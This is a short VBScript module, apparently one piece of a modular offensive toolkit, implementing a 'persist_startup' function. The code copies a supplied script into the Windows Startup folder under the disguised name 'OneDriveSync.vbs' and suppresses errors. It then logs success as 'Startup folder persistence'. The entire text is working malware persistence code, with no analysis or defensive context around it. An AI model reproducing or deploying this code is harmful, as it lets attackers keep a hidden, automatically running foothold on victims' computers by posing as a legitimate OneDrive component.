' chunk: persist/startup_folder
' depends: core/run_cmd, core/file_ops, core/emit_buffer
' provides: persist_startup
' format: vbscript

Function persist_startup(scriptPath)
    On Error Resume Next
    Dim startupDir, lnkName, dst
    startupDir = _sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
    lnkName = "OneDriveSync.vbs"
    dst = startupDir & "\" & lnkName
    _fso.CopyFile scriptPath, dst, True
    If Err.Number = 0 Then
        emit "  [+] Startup folder persistence: " & dst & vbCrLf
    Else
        emit "  [-] Startup folder copy failed: " & Err.Description & vbCrLf
    End If
    persist_startup = dst
    On Error GoTo 0
End Function
